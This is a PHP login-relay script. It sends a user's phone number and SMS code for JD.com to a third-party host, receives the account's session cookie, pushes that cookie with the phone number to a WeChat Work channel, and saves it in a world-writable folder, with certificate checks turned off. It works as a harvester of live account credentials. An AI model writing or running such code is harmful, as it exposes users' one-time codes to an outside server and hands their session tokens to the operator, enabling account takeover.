<?php

ini_set('date.timezone','Asia/Shanghai');  
header("Content-type: application/json; charset=utf-8"); 
 
foreach($_REQUEST as $key => $value){
    $ui[$key] = trim($value);
}
$postData = file_get_contents("php://input"); 

$UA="Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";

if(!empty($postData)){
	
		$data = json_decode($postData); 
		
		// var_dump($data);
		@$mobile=$data-> mobile;
		@$smscode=$data-> smsCode;
 
	if(!preg_match("/^1[3456789]\d{9}$/", $mobile)){
		
		
		die('{"status":282,"msg":"手机号格式错误！!"}');
		
	} 

	if(!empty($mobile) and  empty($smscode)){
			//获取验证码
 
 
		if(preg_match("/^1[3456789]\d{9}$/", $mobile)){
			
			 
			smslogin_sendmsg($mobile);
			
		}else{
			
			
			die('{"status":281,"msg":"手机号格式错误！"}');
		}
	
		
	}else if(empty($mobile) and empty($smscode)){
		
		die('{"status":444,"msg":"非法操作！$mobile"}');
		
	}
	


		@$guid=$data-> guid;
		@$lsid=$data-> lsid;
		@$ps=$data-> ps;
		
		if(!empty($guid) and !empty($lsid)){
 
		$cookie="guid=".$guid."; lsid=".$lsid."; pt_key=; pt_token=";
 
		dosmslogin($cookie,$mobile,$smscode);
		
 
		}else{
			
			
			die('{"status":444,"msg":"非法操作！"}');
			
		}
	
	
	
	
}else if(isset ($_REQUEST['mobile'])){
	
	$mobile=$ui["mobile"];
	
 
	if(preg_match("/^1[3456789]\d{9}$/", $mobile)){
		
	 
		smslogin_sendmsg($mobile);
		
	}else{
		
		
		die('{"status":281,"msg":"手机号格式错误！"}');
	}
	
	
	
}else{
		
	
	die('{"status":404,"msg":"手机号不能为空！"}');
	
	
}


function smslogin_sendmsg($mobile) {
 

$url="http://jd.zack.xin/sms/jd/api/jdsms.php";

$data = json_encode(array('mobile' => $mobile));
 

$r=curlGet($url,"","0","post",$data);

 
die($r); 

}


function dosmslogin($cookie,$mobile,$smscode) {
//短信换取CK
 
global $ps;
 

$url="http://jd.zack.xin/sms/jd/api/jdsms.php";

 

// $data="mobile=".$mobile."&smscode=".$smscode;



$data = json_encode(array('mobile' => $mobile,'smsCode' => $smscode,'ps' => $ps));
 
 
 
$r=curlGet($url,$cookie,"0","post",$data);

 

$r_json=json_decode($r);

 
$status=$r_json->status;//err_code=0

	if($status==200){
		$JDcookie=$r_json->cookie;
	 
	 
	 
		$time=date('Y-m-d H:i:s',time());


		if(empty($ps)){
			$ps="";
			
			$weixin_msg= "【JD COOKIE】【短信端】\n【".$time."】\n【".$mobile."】\n  【COOKIE】:\n".$JDcookie;
			
		}else{
			
			$weixin_msg= "【JD COOKIE】【短信端】\n【".$time."】\n【".$mobile."】\n【备注：".$ps."】  \n【COOKIE】:\n".$JDcookie;
			
		}
	 
		getPush("@all" , "1000005" , $weixin_msg);//getPush("@all" , "替换你的 agentid" , $weixin_msg);需要修改成你的 
		CK_tmp($JDcookie,$mobile);
		
			
		die($r); 

	}else{
	 
		//错误
		die($r); 
	}

}

///////////////////////////////////////////////////////////////////////////////////

 
 


function CK_tmp($ck_str,$user){
$content=$ck_str;
$date_T=date('y-m-d',time());
$path="./CK/${date_T}/";

		if (!is_dir($path)){ 
		$res=mkdir($path,0777,true); 
		     if (!$res){
				$json_err = array (
				'status'=>201,
				'msg'=>'操作错误！！！'
				); 
					
				
				die(json_encode($json_err));
			 }
		 
		}  

$file  = $path.$user.'_'.msectime().'.cookie';	 
file_put_contents($file, $content,FILE_APPEND);
 
}




 


///////////////////////////////////////////////////////////////////////////////////
   

function curlGet($url,$cookie, $HEADER="",$method = '', $post = ''){
//模拟登陆 抓取内容

 
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $url);
  
  if ($HEADER == '1') {
   curl_setopt($curl, CURLOPT_HEADER, 1);
  }
  
 $headerArr = array("Content-Type:application/json; charset=UTF-8"); 
 
 curl_setopt ($curl, CURLOPT_HTTPHEADER , $headerArr);  //构造headers
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
 
  
  curl_setopt($curl, CURLOPT_COOKIE, $cookie); //使用上面获取的cookies
 
  
  if ($method == 'post') {
   curl_setopt($curl, CURLOPT_POST, 1);
   curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
  }
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
  $str = curl_exec($curl);
 // $str = iconv("GBK", "UTF-8//IGNORE", $str);
  curl_close($curl);
  unset($curl);
  return $str;
 } 


function msectime() {
   list($msec, $sec) = explode(' ', microtime());
   $msectime =  (float)sprintf('%.0f', (floatval($msec) + floatval($sec)) * 1000);
   return $msectime;
}

//###########**********微信推送部分***********#########################
//推送信息
//
function getPush($userid , $agentid , $message){
$userinfo = getToken();//获取access_token
$access_token = $userinfo['access_token'];
$sendmsg_url = "https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=".$access_token;
// echo($sendmsg_url);
$data="{\"touser\":\"$userid\",\"msgtype\":\"text\",\"agentid\":$agentid,\"text\":{\"content\":\"$message\"},\"safe\":0}";
$res = curlPost($sendmsg_url,$data);
/* var_dump($res); */
$errmsg=json_decode($res)->errmsg;
if($errmsg==="ok"){;
return 1;//推送成功

}else{
return 0;//推送失败
}
}
//获取token
function getToken(){
$corpid = "替换你的 企业ID"; 
$corpsecret = "替换你的 corpsecret"; 
// $corpid = "xxxxxxxxxxxxxxxx"; 
// $corpsecret = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"; 
$Url="https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=".$corpid."&corpsecret=".$corpsecret;

// echo($Url);

$res = curlPost($Url);
$access_token=json_decode($res)->access_token;
$userinfo = array();
$userinfo['access_token']=$access_token;

// echo($access_token);
return $userinfo;
}
//定义curl方法
function curlPost($url,$data=""){   
$ch = curl_init();
$opt = array(
CURLOPT_URL     => $url,            
CURLOPT_HEADER  => 0,
CURLOPT_POST    => 1,
CURLOPT_POSTFIELDS      => $data,
CURLOPT_RETURNTRANSFER  => 1,
CURLOPT_TIMEOUT         => 20
);
$ssl = substr($url,0,8) == "https://" ? TRUE : FALSE;
if ($ssl){
$opt[CURLOPT_SSL_VERIFYHOST] = 2;
$opt[CURLOPT_SSL_VERIFYPEER] = FALSE;
}
curl_setopt_array($ch,$opt);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
//###########**********微信推送部分***********######################### 

?>
